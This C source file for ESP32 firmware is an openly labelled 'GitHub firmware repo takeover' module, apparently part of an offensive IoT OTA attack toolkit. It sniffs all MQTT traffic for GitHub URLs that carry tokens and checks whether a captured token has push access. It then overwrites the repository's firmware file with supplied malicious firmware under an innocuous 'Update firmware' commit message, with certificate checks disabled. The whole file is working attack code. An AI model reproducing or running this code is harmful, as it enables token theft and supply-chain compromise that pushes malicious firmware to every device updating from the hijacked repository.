/**
 * ota_github.c - GitHub firmware repo takeover
 */

#include "ota_github.h"
#include "ota_common.h"
#include "heap_psram.h"

#include "esp_log.h"
#include "esp_timer.h"
#include "esp_http_client.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>

static const char *TAG = "ota_github";

static ota_github_config_t s_cfg;
static ota_github_state_t s_state;
static volatile bool s_running = false;
static TaskHandle_t s_task = NULL;
static SemaphoreHandle_t s_exit_sem = NULL;
static esp_timer_handle_t s_timeout = NULL;
static int64_t s_start_ms = 0;

static ota_github_repo_t current_repo;
static char gh_result_json[1024] = "";

static const char b64_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int base64_encode(const uint8_t *src, int src_len, char *dst, int dst_max)
{
    int i = 0, j = 0;
    while (i < src_len && j + 4 < dst_max) {
        int remaining = src_len - i;
        uint32_t a = (i < src_len) ? src[i++] : 0;
        uint32_t b_v = (i < src_len) ? src[i++] : 0;
        uint32_t c = (i < src_len) ? src[i++] : 0;
        uint32_t triple = (a << 16) | (b_v << 8) | c;

        dst[j++] = b64_table[(triple >> 18) & 0x3F];
        dst[j++] = b64_table[(triple >> 12) & 0x3F];
        dst[j++] = (remaining > 1) ? b64_table[(triple >> 6) & 0x3F] : '=';
        dst[j++] = (remaining > 2) ? b64_table[triple & 0x3F] : '=';
    }
    dst[j] = '\0';
    return j;
}

static esp_err_t gh_http_cb(esp_http_client_event_t *evt)
{
    char *buf = ota_common_gh_api_resp_buf();
    int *len_ptr = ota_common_gh_api_resp_len_ptr();
    switch (evt->event_id) {
    case HTTP_EVENT_ON_DATA:
        if (buf && len_ptr && *len_ptr + evt->data_len < OTA_GH_API_RESP_LEN) {
            memcpy(buf + *len_ptr, evt->data, evt->data_len);
            *len_ptr += evt->data_len;
            buf[*len_ptr] = '\0';
        }
        break;
    default:
        break;
    }
    return ESP_OK;
}

static int gh_api_request(const char *method, const char *api_path,
                          const char *token, const char *body, int body_len)
{
    char *buf = ota_common_gh_api_resp_buf();
    int *len_ptr = ota_common_gh_api_resp_len_ptr();
    if (buf) buf[0] = '\0';
    if (len_ptr) *len_ptr = 0;

    char url[256];
    snprintf(url, sizeof(url), "https://api.github.com%s", api_path);

    ESP_LOGI(TAG, "GH API %s %s", method, api_path);

    esp_http_client_config_t http_cfg = {
        .url = url,
        .event_handler = gh_http_cb,
        .timeout_ms = 30000,
    };
    http_cfg.skip_cert_common_name_check = true;
    http_cfg.cert_pem = NULL;

    esp_http_client_handle_t client = esp_http_client_init(&http_cfg);
    if (!client) {
        ESP_LOGE(TAG, "GH API: Failed to init HTTP client");
        return -1;
    }

    char auth_hdr[192];
    snprintf(auth_hdr, sizeof(auth_hdr), "token %s", token);
    esp_http_client_set_header(client, "Authorization", auth_hdr);
    esp_http_client_set_header(client, "Accept", "application/vnd.github.v3+json");
    esp_http_client_set_header(client, "User-Agent", "OmegaSolutions");
    esp_http_client_set_header(client, "Content-Type", "application/json");

    if (strcmp(method, "GET") == 0) {
        esp_http_client_set_method(client, HTTP_METHOD_GET);
    } else {
        esp_http_client_set_method(client, HTTP_METHOD_PUT);
        if (body && body_len > 0) {
            esp_http_client_set_post_field(client, body, body_len);
        }
    }

    esp_err_t err = esp_http_client_perform(client);
    int status = esp_http_client_get_status_code(client);
    esp_http_client_cleanup(client);

    if (err != ESP_OK) {
        ESP_LOGE(TAG, "GH API: HTTP request failed: %d", err);
        return -1;
    }

    ESP_LOGI(TAG, "GH API: %s %s -> HTTP %d", method, api_path, status);
    return status;
}

static void timeout_cb(void *arg)
{
    (void)arg;
    s_state.timeout = true;
    s_running = false;
}

static void fill_conn(ota_conn_params_t *p)
{
    memset(p, 0, sizeof(*p));
    strncpy(p->wifi_ssid, s_cfg.wifi_ssid, sizeof(p->wifi_ssid) - 1);
    strncpy(p->wifi_password, s_cfg.wifi_password, sizeof(p->wifi_password) - 1);
    strncpy(p->mqtt_broker, s_cfg.mqtt_broker, sizeof(p->mqtt_broker) - 1);
    p->mqtt_port = s_cfg.mqtt_port ? s_cfg.mqtt_port : OTA_DEFAULT_MQTT_PORT;
    strncpy(p->mqtt_username, s_cfg.mqtt_username, sizeof(p->mqtt_username) - 1);
    strncpy(p->mqtt_password, s_cfg.mqtt_password, sizeof(p->mqtt_password) - 1);
    strncpy(p->mqtt_client_id,
            s_cfg.mqtt_client_id[0] ? s_cfg.mqtt_client_id : "omega_ota_gh",
            sizeof(p->mqtt_client_id) - 1);
    strncpy(p->subscribe_topic,
            s_cfg.subscribe_topic[0] ? s_cfg.subscribe_topic : "#",
            sizeof(p->subscribe_topic) - 1);
    p->auto_subscribe = true;
}

static void task_fn(void *arg)
{
    (void)arg;
    ota_conn_params_t conn;
    fill_conn(&conn);

    strncpy(s_state.state, "wifi_connecting", sizeof(s_state.state) - 1);
    if (s_cfg.wifi_ssid[0]) {
        if (ota_common_wifi_connect(&conn) != ESP_OK) {
            strncpy(s_state.error, "wifi_failed", sizeof(s_state.error) - 1);
            strncpy(s_state.state, "error", sizeof(s_state.state) - 1);
            goto done;
        }
    }

    strncpy(s_state.state, "mqtt_connecting", sizeof(s_state.state) - 1);
    if (ota_common_mqtt_connect(&conn, NULL) != ESP_OK) {
        strncpy(s_state.error, "mqtt_failed", sizeof(s_state.error) - 1);
        strncpy(s_state.state, "error", sizeof(s_state.state) - 1);
        goto done;
    }

    strncpy(s_state.state, "waiting_github_url", sizeof(s_state.state) - 1);
    int wait_loops = 0;
    int max_wait = (int)s_cfg.timeout_sec;
    while (s_running && ota_common_mqtt_is_connected() &&
           ota_common_get_github_url_count() == 0 && wait_loops < max_wait) {
        s_state.github_urls = ota_common_get_github_url_count();
        s_state.elapsed_sec = (uint32_t)((ota_common_now_ms() - s_start_ms) / 1000);
        vTaskDelay(pdMS_TO_TICKS(1000));
        wait_loops++;
    }

    s_state.github_urls = ota_common_get_github_url_count();
    if (!s_running) goto done;

    if (s_state.github_urls == 0) {
        ESP_LOGE(TAG, "No GitHub URLs captured");
        strncpy(s_state.error, "no_github_url", sizeof(s_state.error) - 1);
        strncpy(s_state.state, "error", sizeof(s_state.state) - 1);
        goto done;
    }

    ESP_LOGI(TAG, "Found %u GitHub URL(s)", (unsigned)s_state.github_urls);

    int gh_idx = -1;
    int url_entries = ota_common_get_url_entries();
    ota_url_entry_t *urls = ota_common_get_urls();
    for (int i = 0; i < url_entries; i++) {
        if (urls[i].has_github_token) {
            char tok[OTA_GH_TOKEN_LEN] = "";
            ota_common_extract_github_token(urls[i].url, tok, sizeof(tok));
            if (tok[0]) { gh_idx = i; break; }
        }
    }
    if (gh_idx < 0 && s_cfg.gh_captured_url_index >= 0 &&
        s_cfg.gh_captured_url_index < url_entries) {
        gh_idx = s_cfg.gh_captured_url_index;
    }
    if (gh_idx < 0) {
        for (int i = 0; i < url_entries; i++) {
            if (ota_common_is_github_url(urls[i].url)) {
                gh_idx = i;
                break;
            }
        }
    }
    if (gh_idx < 0) {
        ESP_LOGE(TAG, "No GitHub URL in capture buffer");
        strncpy(s_state.error, "no_github_url", sizeof(s_state.error) - 1);
        strncpy(s_state.state, "error", sizeof(s_state.state) - 1);
        goto done;
    }

    strncpy(s_state.state, "parsing_url", sizeof(s_state.state) - 1);
    memset(&current_repo, 0, sizeof(current_repo));
    if (!ota_github_parse_url(urls[gh_idx].url, &current_repo)) {
        ESP_LOGE(TAG, "Failed to parse URL: %s", urls[gh_idx].url);
        strncpy(s_state.error, "parse_failed", sizeof(s_state.error) - 1);
        strncpy(s_state.state, "error", sizeof(s_state.state) - 1);
        goto done;
    }

    if (s_cfg.gh_branch[0]) {
        strncpy(current_repo.branch, s_cfg.gh_branch, sizeof(current_repo.branch) - 1);
    }

    ESP_LOGI(TAG, "Parsed repo: %s/%s path=%s branch=%s",
             current_repo.owner, current_repo.repo, current_repo.path, current_repo.branch);

    strncpy(s_state.state, "accessing_repo", sizeof(s_state.state) - 1);
    if (!ota_github_access_repo(&current_repo)) {
        ESP_LOGE(TAG, "Token does not have repo access");
        strncpy(s_state.error, "access_denied", sizeof(s_state.error) - 1);
        strncpy(s_state.state, "error", sizeof(s_state.state) - 1);
        goto done;
    }

    const char *target_path = s_cfg.gh_firmware_path[0]
                                  ? s_cfg.gh_firmware_path
                                  : current_repo.path;
    if (target_path[0]) {
        strncpy(s_state.state, "getting_sha", sizeof(s_state.state) - 1);
        ota_github_get_file_sha(&current_repo, target_path);
        ESP_LOGI(TAG, "File SHA: %s", current_repo.file_sha);
    }

    strncpy(s_state.state, "listing_files", sizeof(s_state.state) - 1);
    ota_github_list_files(&current_repo, "");
    ESP_LOGI(TAG, "Repo files listed");

    if (s_cfg.malicious_firmware && s_cfg.malicious_firmware_size > 0) {
        strncpy(s_state.state, "uploading", sizeof(s_state.state) - 1);
        const char *commit_msg = s_cfg.gh_commit_msg[0]
                                     ? s_cfg.gh_commit_msg
                                     : "Update firmware";
        bool uploaded = ota_github_upload_firmware(
            &current_repo, s_cfg.malicious_firmware, s_cfg.malicious_firmware_size,
            target_path, commit_msg);
        if (uploaded) {
            s_state.uploaded = true;
            strncpy(s_state.state, "uploaded", sizeof(s_state.state) - 1);
            ESP_LOGI(TAG, "Malicious firmware uploaded successfully");
        } else {
            ESP_LOGE(TAG, "Firmware upload FAILED");
            strncpy(s_state.error, "upload_failed", sizeof(s_state.error) - 1);
            strncpy(s_state.state, "error", sizeof(s_state.state) - 1);
        }
    } else {
        ESP_LOGW(TAG, "No malicious firmware provided, skipping upload");
        strncpy(s_state.state, "repo_accessible", sizeof(s_state.state) - 1);
    }

done:
    ota_common_mqtt_disconnect();
    ota_common_wifi_restore_ap();
    if (s_timeout) esp_timer_stop(s_timeout);
    s_state.active = false;
    s_state.elapsed_sec = (uint32_t)((ota_common_now_ms() - s_start_ms) / 1000);
    if (strcmp(s_state.state, "error") != 0 && strcmp(s_state.state, "uploaded") != 0 &&
        strcmp(s_state.state, "repo_accessible") != 0) {
        strncpy(s_state.state, "idle", sizeof(s_state.state) - 1);
    }
    s_running = false;
    ota_common_release();
    if (s_exit_sem) xSemaphoreGive(s_exit_sem);
    s_task = NULL;
    vTaskDelete(NULL);
}

void ota_github_init(void)
{
    if (!s_exit_sem) s_exit_sem = xSemaphoreCreateBinary();
    if (!s_timeout) {
        esp_timer_create_args_t a = { .callback = timeout_cb, .name = "ota_gh_to" };
        esp_timer_create(&a, &s_timeout);
    }
    memset(&s_state, 0, sizeof(s_state));
    memset(&current_repo, 0, sizeof(current_repo));
    gh_result_json[0] = '\0';
    strncpy(s_state.state, "idle", sizeof(s_state.state) - 1);
}

esp_err_t ota_github_start(const ota_github_config_t *cfg)
{
    if (!cfg) return ESP_ERR_INVALID_ARG;
    if (s_running) return ESP_ERR_INVALID_STATE;
    esp_err_t claim = ota_common_try_claim("github");
    if (claim != ESP_OK) return claim;

    s_cfg = *cfg;
    if (!s_cfg.timeout_sec) s_cfg.timeout_sec = OTA_DEFAULT_TIMEOUT_SEC;
    memset(&s_state, 0, sizeof(s_state));
    memset(&current_repo, 0, sizeof(current_repo));
    gh_result_json[0] = '\0';
    strncpy(s_state.state, "starting", sizeof(s_state.state) - 1);
    ota_common_capture_reset();
    s_start_ms = ota_common_now_ms();
    s_state.active = true;
    s_running = true;

    if (s_timeout) {
        esp_timer_stop(s_timeout);
        esp_timer_start_once(s_timeout, (uint64_t)s_cfg.timeout_sec * 1000000ULL);
    }
    if (xTaskCreate(task_fn, "ota_github", OTA_TASK_STACK_SIZE, NULL,
                    OTA_TASK_PRIORITY, &s_task) != pdPASS) {
        s_running = false;
        s_state.active = false;
        ota_common_release();
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "GitHub takeover started");
    return ESP_OK;
}

esp_err_t ota_github_stop(void)
{
    if (!s_running) return ESP_OK;
    s_running = false;
    if (s_exit_sem &&
        xSemaphoreTake(s_exit_sem, pdMS_TO_TICKS(OTA_STOP_SEM_TIMEOUT_MS)) != pdTRUE) {
        if (s_task) { vTaskDelete(s_task); s_task = NULL; }
        ota_common_mqtt_disconnect();
        ota_common_wifi_restore_ap();
        ota_common_release();
        s_state.active = false;
    }
    if (s_timeout) esp_timer_stop(s_timeout);
    return ESP_OK;
}

bool ota_github_is_active(void) { return s_state.active; }
const ota_github_state_t *ota_github_get_state(void) { return &s_state; }

cJSON *ota_github_get_status_json(void)
{
    cJSON *o = cJSON_CreateObject();
    if (!o) return NULL;
    cJSON_AddBoolToObject(o, "active", s_state.active);
    cJSON_AddBoolToObject(o, "timeout", s_state.timeout);
    cJSON_AddBoolToObject(o, "uploaded", s_state.uploaded);
    cJSON_AddNumberToObject(o, "github_urls", s_state.github_urls);
    cJSON_AddNumberToObject(o, "elapsed_sec", s_state.elapsed_sec);
    cJSON_AddStringToObject(o, "state", s_state.state);
    if (s_state.error[0]) cJSON_AddStringToObject(o, "error", s_state.error);
    return o;
}

bool ota_github_parse_url(const char *url, ota_github_repo_t *out)
{
    if (!url || !out) return false;
    memset(out, 0, sizeof(*out));

    const char *raw_prefix = "raw.githubusercontent.com/";
    const char *raw_pos = strstr(url, raw_prefix);
    if (raw_pos) {
        raw_pos += strlen(raw_prefix);
        int i = 0;
        while (*raw_pos != '/' && *raw_pos != '\0' && *raw_pos != '?' && i < OTA_GH_OWNER_LEN - 1) {
            out->owner[i++] = *raw_pos++;
        }
        out->owner[i] = '\0';
        if (*raw_pos != '/') { out->parsed = false; return false; }
        raw_pos++;
        i = 0;
        while (*raw_pos != '/' && *raw_pos != '\0' && *raw_pos != '?' && i < OTA_GH_REPO_LEN - 1) {
            out->repo[i++] = *raw_pos++;
        }
        out->repo[i] = '\0';
        if (*raw_pos != '/') { out->parsed = true; return true; }
        raw_pos++;
        i = 0;
        while (*raw_pos != '/' && *raw_pos != '\0' && *raw_pos != '?' && i < OTA_GH_BRANCH_LEN - 1) {
            out->branch[i++] = *raw_pos++;
        }
        out->branch[i] = '\0';
        if (*raw_pos != '/') { out->parsed = true; return true; }
        raw_pos++;
        i = 0;
        while (*raw_pos != '\0' && *raw_pos != '?' && i < OTA_GH_PATH_LEN - 1) {
            out->path[i++] = *raw_pos++;
        }
        out->path[i] = '\0';
    } else {
        const char *gh_prefix = "github.com/";
        const char *gh_pos = strstr(url, gh_prefix);
        if (!gh_pos) { out->parsed = false; return false; }
        gh_pos += strlen(gh_prefix);
        int i = 0;
        while (*gh_pos != '/' && *gh_pos != '\0' && *gh_pos != '?' && i < OTA_GH_OWNER_LEN - 1) {
            out->owner[i++] = *gh_pos++;
        }
        out->owner[i] = '\0';
        if (*gh_pos != '/') { out->parsed = false; return false; }
        gh_pos++;
        i = 0;
        while (*gh_pos != '/' && *gh_pos != '\0' && *gh_pos != '?' && i < OTA_GH_REPO_LEN - 1) {
            out->repo[i++] = *gh_pos++;
        }
        out->repo[i] = '\0';
        strncpy(out->branch, "main", OTA_GH_BRANCH_LEN - 1);
        if (*gh_pos == '/') {
            gh_pos++;
            const char *skip_prefixes[] = { "releases/download/", "blob/", "raw/", "tree/", NULL };
            for (int s = 0; skip_prefixes[s]; s++) {
                if (strncmp(gh_pos, skip_prefixes[s], strlen(skip_prefixes[s])) == 0) {
                    gh_pos += strlen(skip_prefixes[s]);
                    if (strcmp(skip_prefixes[s], "blob/") == 0 ||
                        strcmp(skip_prefixes[s], "tree/") == 0) {
                        int bi = 0;
                        while (*gh_pos != '/' && *gh_pos != '\0' && bi < OTA_GH_BRANCH_LEN - 1) {
                            out->branch[bi++] = *gh_pos++;
                        }
                        out->branch[bi] = '\0';
                        if (*gh_pos == '/') gh_pos++;
                    } else if (strcmp(skip_prefixes[s], "releases/download/") == 0) {
                        int ti = 0;
                        while (*gh_pos != '/' && *gh_pos != '\0' && ti < OTA_GH_BRANCH_LEN - 1) {
                            out->branch[ti++] = *gh_pos++;
                        }
                        out->branch[ti] = '\0';
                        if (*gh_pos == '/') gh_pos++;
                    }
                    break;
                }
            }
            int pi = 0;
            while (*gh_pos != '\0' && *gh_pos != '?' && pi < OTA_GH_PATH_LEN - 1) {
                out->path[pi++] = *gh_pos++;
            }
            out->path[pi] = '\0';
        }
    }

    ota_common_extract_github_token(url, out->token, OTA_GH_TOKEN_LEN);
    out->parsed = (out->owner[0] && out->repo[0]);
    if (out->parsed) {
        ESP_LOGI(TAG, "GH PARSE: owner=%s repo=%s branch=%s path=%s token=%s",
                 out->owner, out->repo, out->branch, out->path,
                 out->token[0] ? "***PRESENT***" : "NONE");
        current_repo = *out;
    }
    return out->parsed;
}

bool ota_github_access_repo(ota_github_repo_t *repo)
{
    if (!repo) return false;
    if ((!repo->owner[0] || !repo->token[0]) && current_repo.parsed && current_repo.token[0]) {
        *repo = current_repo;
    }
    if (!repo->parsed || !repo->token[0]) return false;
    char *resp = ota_common_gh_api_resp_buf();
    if (!resp) return false;

    char api_path[192];
    snprintf(api_path, sizeof(api_path), "/repos/%s/%s", repo->owner, repo->repo);
    int status = gh_api_request("GET", api_path, repo->token, NULL, 0);
    if (status == 200) {
        repo->token_valid = true;
        if (resp && strstr(resp, "\"push\":true")) {
            ESP_LOGI(TAG, "GH ACCESS: Token has PUSH access!");
        } else if (resp && strstr(resp, "\"push\":false")) {
            ESP_LOGW(TAG, "GH ACCESS: Token has READ but NO push access");
            repo->token_valid = false;
        } else {
            repo->token_valid = true;
        }
        snprintf(gh_result_json, sizeof(gh_result_json),
                 "{\"access\":true,\"owner\":\"%s\",\"repo\":\"%s\",\"push\":%s}",
                 repo->owner, repo->repo, repo->token_valid ? "true" : "false");
        current_repo = *repo;
    } else {
        repo->token_valid = false;
        snprintf(gh_result_json, sizeof(gh_result_json),
                 "{\"access\":false,\"status\":%d}", status);
    }
    return (status == 200);
}

const char *ota_github_list_files(ota_github_repo_t *repo, const char *path)
{
    if (!repo) return "[]";
    if ((!repo->parsed || !repo->token[0]) && current_repo.parsed && current_repo.token[0]) {
        *repo = current_repo;
    }
    if (!repo->parsed || !repo->token[0]) return "[]";
    char *resp = ota_common_gh_api_resp_buf();
    char *result_buf = ota_common_json_result();
    if (!resp || !result_buf) return "[]";

    char api_path[192];
    if (path && path[0]) {
        snprintf(api_path, sizeof(api_path), "/repos/%s/%s/contents/%s?ref=%s",
                 repo->owner, repo->repo, path, repo->branch);
    } else {
        snprintf(api_path, sizeof(api_path), "/repos/%s/%s/contents/?ref=%s",
                 repo->owner, repo->repo, repo->branch);
    }
    int status = gh_api_request("GET", api_path, repo->token, NULL, 0);
    if (status == 200 && resp) {
        cJSON *root = cJSON_Parse(resp);
        if (root && cJSON_IsArray(root)) {
            cJSON *simplified = cJSON_CreateArray();
            int count = cJSON_GetArraySize(root);
            for (int i = 0; i < count && i < 20; i++) {
                cJSON *item = cJSON_GetArrayItem(root, i);
                cJSON *name = cJSON_GetObjectItem(item, "name");
                cJSON *f_type = cJSON_GetObjectItem(item, "type");
                cJSON *sha = cJSON_GetObjectItem(item, "sha");
                cJSON *size = cJSON_GetObjectItem(item, "size");
                cJSON *sitem = cJSON_CreateObject();
                if (name) cJSON_AddStringToObject(sitem, "name", name->valuestring);
                if (f_type) cJSON_AddStringToObject(sitem, "type", f_type->valuestring);
                if (sha) cJSON_AddStringToObject(sitem, "sha", sha->valuestring);
                if (size) cJSON_AddNumberToObject(sitem, "size", size->valuedouble);
                cJSON_AddItemToArray(simplified, sitem);
            }
            char *printed = cJSON_PrintUnformatted(simplified);
            snprintf(result_buf, OTA_JSON_2K_SZ, "{\"files\":%s}", printed ? printed : "[]");
            cJSON_Delete(simplified);
            free(printed);
            cJSON_Delete(root);
            return result_buf;
        }
        if (root) cJSON_Delete(root);
    }
    snprintf(result_buf, OTA_JSON_2K_SZ, "{\"error\":true,\"status\":%d}", status);
    return result_buf;
}

bool ota_github_get_file_sha(ota_github_repo_t *repo, const char *file_path)
{
    if (!repo) return false;
    if ((!repo->parsed || !repo->token[0]) && current_repo.parsed && current_repo.token[0]) {
        *repo = current_repo;
    }
    if (!repo->parsed || !repo->token[0]) return false;
    char *resp = ota_common_gh_api_resp_buf();
    if (!resp) return false;

    char api_path[192];
    snprintf(api_path, sizeof(api_path), "/repos/%s/%s/contents/%s?ref=%s",
             repo->owner, repo->repo, file_path, repo->branch);
    int status = gh_api_request("GET", api_path, repo->token, NULL, 0);
    if (status == 200 && resp) {
        cJSON *root = cJSON_Parse(resp);
        if (root) {
            cJSON *sha = cJSON_GetObjectItem(root, "sha");
            if (sha && sha->valuestring) {
                strncpy(repo->file_sha, sha->valuestring, OTA_GH_SHA_LEN - 1);
                repo->file_sha[OTA_GH_SHA_LEN - 1] = '\0';
                current_repo = *repo;
                cJSON_Delete(root);
                return true;
            }
            cJSON_Delete(root);
        }
    }
    return false;
}

bool ota_github_upload_firmware(ota_github_repo_t *repo,
                                const uint8_t *firmware_data,
                                uint32_t firmware_size,
                                const char *target_path,
                                const char *commit_msg)
{
    if (!repo) return false;
    if ((!repo->parsed || !repo->token[0]) && current_repo.parsed && current_repo.token[0]) {
        *repo = current_repo;
    }
    if (!repo->parsed || !repo->token[0]) return false;
    if (!firmware_data || firmware_size == 0) return false;
    if (!ota_common_gh_api_resp_buf()) return false;

    ESP_LOGI(TAG, "GH UPLOAD: %u bytes to %s/%s:%s",
             (unsigned)firmware_size, repo->owner, repo->repo,
             target_path ? target_path : repo->path);

    int b64_max = ((firmware_size + 2) / 3) * 4 + 4;
    char *b64_data = heap_psram_malloc(b64_max);
    if (!b64_data) return false;
    base64_encode(firmware_data, (int)firmware_size, b64_data, b64_max);

    const char *tpath = target_path ? target_path : repo->path;
    const char *cmsg = commit_msg ? commit_msg : "Update firmware";
    int body_max = (int)(96 + strlen(cmsg) + strlen(b64_data) + strlen(repo->branch) +
                         (repo->file_sha[0] ? strlen(repo->file_sha) + 16 : 0));
    char *body = heap_psram_malloc(body_max);
    if (!body) { heap_psram_free(b64_data); return false; }

    if (repo->file_sha[0]) {
        snprintf(body, body_max,
                 "{\"message\":\"%s\",\"content\":\"%s\",\"sha\":\"%s\",\"branch\":\"%s\"}",
                 cmsg, b64_data, repo->file_sha, repo->branch);
    } else {
        snprintf(body, body_max,
                 "{\"message\":\"%s\",\"content\":\"%s\",\"branch\":\"%s\"}",
                 cmsg, b64_data, repo->branch);
    }
    heap_psram_free(b64_data);

    char api_path[192];
    snprintf(api_path, sizeof(api_path), "/repos/%s/%s/contents/%s",
             repo->owner, repo->repo, tpath);
    int body_len = (int)strlen(body);
    int status = gh_api_request("PUT", api_path, repo->token, body, body_len);
    heap_psram_free(body);

    if (status == 200 || status == 201) {
        ESP_LOGI(TAG, "GH UPLOAD: SUCCESS!");
        snprintf(gh_result_json, sizeof(gh_result_json),
                 "{\"uploaded\":true,\"owner\":\"%s\",\"repo\":\"%s\",\"path\":\"%s\",\"size\":%u,\"status\":%d}",
                 repo->owner, repo->repo, tpath, (unsigned)firmware_size, status);
        current_repo = *repo;
        return true;
    }

    ESP_LOGE(TAG, "GH UPLOAD: FAILED (HTTP %d)", status);
    snprintf(gh_result_json, sizeof(gh_result_json),
             "{\"uploaded\":false,\"status\":%d}", status);
    return false;
}

const char *ota_github_get_repo_json(void)
{
    char *buf = ota_common_json_tiny();
    if (!buf) return "{}";

    cJSON *root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "owner", current_repo.owner);
    cJSON_AddStringToObject(root, "repo", current_repo.repo);
    cJSON_AddStringToObject(root, "path", current_repo.path);
    cJSON_AddStringToObject(root, "branch", current_repo.branch);
    cJSON_AddBoolToObject(root, "token_valid", current_repo.token_valid);
    cJSON_AddBoolToObject(root, "parsed", current_repo.parsed);
    if (current_repo.file_sha[0])
        cJSON_AddStringToObject(root, "file_sha", current_repo.file_sha);
    if (current_repo.token[0])
        cJSON_AddBoolToObject(root, "has_token", true);

    char *printed = cJSON_PrintUnformatted(root);
    snprintf(buf, OTA_JSON_TINY_SZ, "%s", printed ? printed : "{}");
    cJSON_Delete(root);
    free(printed);
    return buf;
}

const char *ota_github_get_result_json(void)
{
    if (gh_result_json[0] == '\0') {
        return "{\"success\":false,\"error\":\"No GitHub operation performed\"}";
    }
    return gh_result_json;
}

const char *ota_github_get_urls_json(void)
{
    return ota_common_get_github_urls_json();
}
